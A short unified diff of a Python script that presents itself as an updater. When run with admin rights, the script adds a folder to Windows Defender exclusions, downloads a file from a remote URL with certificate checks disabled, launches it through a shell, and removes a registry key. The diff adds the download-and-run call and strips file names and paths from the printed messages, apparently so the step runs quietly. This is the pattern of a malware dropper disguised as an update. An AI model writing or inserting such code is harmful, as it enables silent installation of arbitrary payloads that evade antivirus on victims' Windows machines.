@@ -81,7 +81,7 @@ class Main:
         
         os.makedirs(APP_DIR, exist_ok=True)
         try:
-            print(f"→ Downloading {FILE_NAME} ...")
+            print(f"→ Downloading...")
             context = ssl._create_unverified_context()
             req = urllib.request.Request(UPDATE_URL)
             req.add_header("Pragma", "no-cache")
@@ -94,18 +94,19 @@ class Main:
             with open(APP_PATH, "wb") as f:
                 f.write(new_content)
 
-            print(f"→ Successfully downloaded/updated: {APP_PATH}")
+            print(f"→ Successfully downloaded/updated")
             subprocess.Popen([APP_PATH], shell=True)
 
         except Exception as e:
-            print(f"Download/Error: {e}")
-            exit(1)
+            print(f"{e}")
+            #exit(1)
 
 if __name__ == "__main__":
     self = Main()
     if is_admin:
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
+        self.download_and_install()
         self.remove_hkey() #123
         self.perform_update()
         exit(0)
